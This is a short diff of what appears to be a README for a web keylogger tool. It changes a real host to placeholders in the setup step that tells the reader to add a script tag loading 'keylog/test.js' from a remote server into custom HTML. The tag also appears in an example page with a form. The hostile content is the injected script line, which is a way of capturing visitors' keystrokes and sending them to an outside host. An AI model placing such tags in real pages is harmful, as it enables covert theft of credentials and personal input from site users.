@@ -36,7 +36,7 @@ http://[HOSTNAME]:[SRVPORT]/keylog/demo
 - (optional) add this line in custom html
 
 ```
-<script type="text/javascript" src="http://pipeter.asuscomm.com:3000/keylog/test.js"></script> 
+<script type="text/javascript" src="http://[HOSTNAME]:[SRVPORT]/keylog/test.js"></script> 
 ```
 example:
 
@@ -59,7 +59,7 @@ example:
     <br><br>
     <input type="submit" value="Submit">
   </form> 
-<script type="text/javascript" src="http://pipeter.asuscomm.com:3000/keylog/test.js"></script>
+<script type="text/javascript" src="http://[HOSTNAME]:[SRVPORT]/keylog/test.js"></script>
 </body>
 </html>
 ```
